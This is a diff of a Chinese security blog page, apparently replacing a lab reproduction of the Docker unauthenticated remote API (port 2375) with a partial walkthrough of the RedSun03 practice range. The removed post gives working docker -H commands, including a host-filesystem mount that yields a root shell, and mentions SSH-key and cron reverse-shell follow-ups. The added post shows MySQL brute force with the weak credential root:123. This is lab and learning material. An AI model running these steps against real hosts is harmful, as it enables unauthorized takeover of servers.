@@ -16,31 +16,35 @@
   <meta name="author" content="August Rosenberg">
   <meta name="keywords" content="">
   
-    <meta name="description" content="信息收集1nmap -sV -p- -T4 10.1.1.200   2375 就是docker 的远程操控端口 如果访问2375端口出现下面这样就是存在漏洞  通过&#x2F;info目录得到docker 信息  漏洞利用1docker -H tcp:L&#x2F;&#x2F;10.1.1.200 ps -a     启动一个容器 1docker -H tcp:&#x2F;&#x2F;10.1.1.200 start 3dc8d67b679d">
+    <meta name="description" content="简介环境搭建时间: 2024-02-02  11:00 环境搭建个人感觉环境搭建还是比较轻松 由于我们是黑盒测试，所以把所有的主机挂起就可以了 然后我们已知的cebnos的主机，我给他安装了一个nat网卡，模拟与kali属于同一个网络环境的情况，还要一个网卡与内网网段一致 其他的都是192.168.93网段的就可 信息收集我们只知道存在与kali同网段的主机，但是并不知道是什么ip 所以直接就nm">
 <meta property="og:type" content="article">
-<meta property="og:title" content="Docker未授权访问漏洞">
-<meta property="og:url" content="https://tsy244.github.io/2024/02/01/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Docker%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/index.html">
+<meta property="og:title" content="RedSun03">
+<meta property="og:url" content="https://tsy244.github.io/2024/02/02/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/RedSun03/index.html">
 <meta property="og:site_name" content="AU9U5T">
-<meta property="og:description" content="信息收集1nmap -sV -p- -T4 10.1.1.200   2375 就是docker 的远程操控端口 如果访问2375端口出现下面这样就是存在漏洞  通过&#x2F;info目录得到docker 信息  漏洞利用1docker -H tcp:L&#x2F;&#x2F;10.1.1.200 ps -a     启动一个容器 1docker -H tcp:&#x2F;&#x2F;10.1.1.200 start 3dc8d67b679d">
+<meta property="og:description" content="简介环境搭建时间: 2024-02-02  11:00 环境搭建个人感觉环境搭建还是比较轻松 由于我们是黑盒测试，所以把所有的主机挂起就可以了 然后我们已知的cebnos的主机，我给他安装了一个nat网卡，模拟与kali属于同一个网络环境的情况，还要一个网卡与内网网段一致 其他的都是192.168.93网段的就可 信息收集我们只知道存在与kali同网段的主机，但是并不知道是什么ip 所以直接就nm">
 <meta property="og:locale" content="en_US">
-<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/others/image-20240201220623616.png">
-<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/others/image-20240201220807954.png">
-<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/others/image-20240201221113830.png">
-<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/others/image-20240201221221484.png">
-<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/others/image-20240201221505633.png">
-<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/others/image-20240201221714944.png">
-<meta property="article:published_time" content="2024-02-01T13:48:08.000Z">
-<meta property="article:modified_time" content="2024-02-01T14:23:41.801Z">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240202112500897.png">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240202112944742.png">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240202113039436.png">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240202114401269.png">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240202120643822.png">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240202120700238.png">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240202124804243.png">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240202124829915.png">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240202124851226.png">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240202125942610.png">
+<meta property="article:published_time" content="2024-02-02T02:59:23.000Z">
+<meta property="article:modified_time" content="2024-02-02T05:00:28.706Z">
 <meta property="article:author" content="August Rosenberg">
-<meta property="article:tag" content="漏洞复现">
+<meta property="article:tag" content="靶场记录">
 <meta name="twitter:card" content="summary_large_image">
-<meta name="twitter:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/others/image-20240201220623616.png">
+<meta name="twitter:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240202112500897.png">
   
   
     <meta name="referrer" content="no-referrer-when-downgrade">
   
   
-  <title>Docker未授权访问漏洞 - AU9U5T</title>
+  <title>RedSun03 - AU9U5T</title>
 
   <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
 
@@ -206,7 +210,7 @@
       <div class="banner-text text-center fade-in-up">
         <div class="h2">
           
-            <span id="subtitle" data-typed-text="Docker未授权访问漏洞"></span>
+            <span id="subtitle" data-typed-text="RedSun03"></span>
           
         </div>
 
@@ -222,8 +226,8 @@
     
       <span class="post-meta">
         <i class="iconfont icon-date-fill" aria-hidden="true"></i>
-        <time datetime="2024-02-01 21:48" pubdate>
-          February 1, 2024 pm
+        <time datetime="2024-02-02 10:59" pubdate>
+          February 2, 2024 am
         </time>
       </span>
     
@@ -234,7 +238,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          482 words
+          423 words
         
       </span>
     
@@ -245,7 +249,7 @@
         
         
         
-          5 mins
+          4 mins
         
       </span>
     
@@ -283,48 +287,58 @@
         <div id="board">
           <article class="post-content mx-auto">
             <!-- SEO header -->
-            <h1 style="display: none">Docker未授权访问漏洞</h1>
+            <h1 style="display: none">RedSun03</h1>
             
             
               <div class="markdown-body">
                 
-                <h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">nmap</span> -sV -p- -T4 <span class="hljs-number">10.1.1.200</span><br></code></pre></td></tr></table></figure>
-
-<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/others/image-20240201220623616.png" srcset="/img/loading.gif" lazyload alt="image-20240201220623616"></p>
-<p>2375 就是docker 的远程操控端口</p>
-<p>如果访问2375端口出现下面这样就是存在漏洞</p>
-<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/others/image-20240201220807954.png" srcset="/img/loading.gif" lazyload alt="image-20240201220807954"></p>
-<p>通过<code>/info</code>目录得到docker 信息</p>
-<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/others/image-20240201221113830.png" srcset="/img/loading.gif" lazyload alt="image-20240201221113830"></p>
-<h1 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h1><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">docker -H tcp:L<span class="hljs-regexp">//</span><span class="hljs-number">10.1</span>.<span class="hljs-number">1.200</span> ps -a<br></code></pre></td></tr></table></figure>
-
-
-
-<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/others/image-20240201221221484.png" srcset="/img/loading.gif" lazyload alt="image-20240201221221484"></p>
-<p>启动一个容器</p>
-<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">docker</span> -H tcp://<span class="hljs-number">10.1.1.200</span> start <span class="hljs-number">3</span>dc8d67b679d <br></code></pre></td></tr></table></figure>
-
-
-
-<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/others/image-20240201221505633.png" srcset="/img/loading.gif" lazyload alt="image-20240201221505633"></p>
-<p>进入一个容器</p>
-<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/others/image-20240201221714944.png" srcset="/img/loading.gif" lazyload alt="image-20240201221714944"></p>
-<p>创建一个busybox容器，但后将宿主的磁盘挂载到容器当中</p>
-<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">docker -H tcp:<span class="hljs-regexp">//</span><span class="hljs-number">10.1</span>.<span class="hljs-number">1.200</span>:<span class="hljs-number">2375</span> run -it -v <span class="hljs-regexp">/:/m</span>nt busybox chroot /mnt sh<br></code></pre></td></tr></table></figure>
-
+                <h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p>环境搭建时间: 2024-02-02  11:00</p>
+<h1 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h1><p>个人感觉环境搭建还是比较轻松</p>
+<p>由于我们是黑盒测试，所以把所有的主机挂起就可以了</p>
+<p>然后我们已知的cebnos的主机，我给他安装了一个nat网卡，模拟与kali属于同一个网络环境的情况，还要一个网卡与内网网段一致</p>
+<p>其他的都是192.168.93网段的就可</p>
+<h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><p>我们只知道存在与kali同网段的主机，但是并不知道是什么ip</p>
+<p>所以直接就nmap收集有哪些主机</p>
+<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240202112500897.png" srcset="/img/loading.gif" lazyload alt="image-20240202112500897"></p>
+<p>138 是我的主机，146应该就是centos的主机了</p>
 <ol>
-<li>docker未授权写ssh公钥获得shell</li>
-<li>写定时任务反弹shell</li>
-</ol>
-<h1 id="修复建议"><a href="#修复建议" class="headerlink" title="修复建议"></a>修复建议</h1><p>修复建议</p>
-<ol>
-<li><p>设置ACL，只允许信任ip连接对应端口</p>
+<li><p>端口扫描</p>
+<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240202112944742.png" srcset="/img/loading.gif" lazyload alt="image-20240202112944742"></p>
+<p>开了一个80端口的ngnix反向代理</p>
+<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240202113039436.png" srcset="/img/loading.gif" lazyload alt="image-20240202113039436"></p>
+<p>有一个blog</p>
+</li>
+<li><p>使用xray进行扫描</p>
+</li>
+<li><p>尝试爆破mysql</p>
+<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240202114401269.png" srcset="/img/loading.gif" lazyload alt="image-20240202114401269"></p>
+<p>弱密码</p>
 <blockquote>
-<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_28929579/article/details/132337504">docker部署rocketmq 4.9.7 并开启ACL 和 dashboard 账号密码_使用docker-compose安装rocketmq4.9.7-CSDN博客</a></p>
+<p>root:123</p>
 </blockquote>
 </li>
-<li><p>开启TLS，使用生成的证书进行认证：<br><a target="_blank" rel="noopener" href="https://docs.docker.com/engine/security/protect-access/">https://docs.docker.com/engine/security/protect-access/</a></p>
+<li><p>敏感目录扫描</p>
+<p>发现robots.txt访问</p>
+<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240202120643822.png" srcset="/img/loading.gif" lazyload alt="image-20240202120643822"></p>
+<p>接着访问</p>
+<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240202120700238.png" srcset="/img/loading.gif" lazyload alt="image-20240202120700238"></p>
+<p>弱密码爆破</p>
+<p>发现不行</p>
+<p>访问配置文件</p>
+<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240202124804243.png" srcset="/img/loading.gif" lazyload alt="image-20240202124804243"></p>
+<p>注意有波浪号</p>
+<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240202124829915.png" srcset="/img/loading.gif" lazyload alt="image-20240202124829915"></p>
+<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240202124851226.png" srcset="/img/loading.gif" lazyload alt="image-20240202124851226"></p>
+<p>尝试访问</p>
+<p>发现不行，经过思考这个应该是mysql的,经过尝试应该是Mysql的密码但是只是一个普通用户的密码</p>
 </li>
+<li><p>查看mysql的表</p>
+<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240202125942610.png" srcset="/img/loading.gif" lazyload alt="image-20240202125942610"></p>
+<p>发现不能爆破出密码</p>
+</li>
+</ol>
+<h1 id="web渗透"><a href="#web渗透" class="headerlink" title="web渗透"></a>web渗透</h1><ol>
+<li>尝试mysql 慢日志反弹shell</li>
 </ol>
 
                 
@@ -338,7 +352,7 @@
     <div class="post-meta">
       <i class="iconfont icon-tags"></i>
       
-        <a href="/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/">#漏洞复现</a>
+        <a href="/tags/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/">#靶场记录</a>
       
     </div>
   
@@ -350,8 +364,8 @@
 
   <div class="license-box my-3">
     <div class="license-title">
-      <div>Docker未授权访问漏洞</div>
-      <div>https://tsy244.github.io/2024/02/01/漏洞复现/Docker未授权访问漏洞/</div>
+      <div>RedSun03</div>
+      <div>https://tsy244.github.io/2024/02/02/靶场记录/RedSun03/</div>
     </div>
     <div class="license-meta">
       
@@ -363,7 +377,7 @@
       
         <div class="license-meta-item license-meta-date">
           <div>Posted on</div>
-          <div>February 1, 2024</div>
+          <div>February 2, 2024</div>
         </div>
       
       
@@ -395,18 +409,12 @@
                   <article class="post-prev col-6">
                     
                     
-                      <a href="/2024/02/02/%E6%B8%97%E9%80%8F/%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/" title="内网横向移动">
-                        <i class="iconfont icon-arrowleft"></i>
-                        <span class="hidden-mobile">内网横向移动</span>
-                        <span class="visible-mobile">Previous</span>
-                      </a>
-                    
                   </article>
                   <article class="post-next col-6">
                     
                     
-                      <a href="/2024/02/01/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Elasticsearch%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/" title="Elasticsearch未授权访问">
-                        <span class="hidden-mobile">Elasticsearch未授权访问</span>
+                      <a href="/2024/02/02/%E6%B8%97%E9%80%8F/%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/" title="内网横向移动">
+                        <span class="hidden-mobile">内网横向移动</span>
                         <span class="visible-mobile">Next</span>
                         <i class="iconfont icon-arrowright"></i>
                       </a>
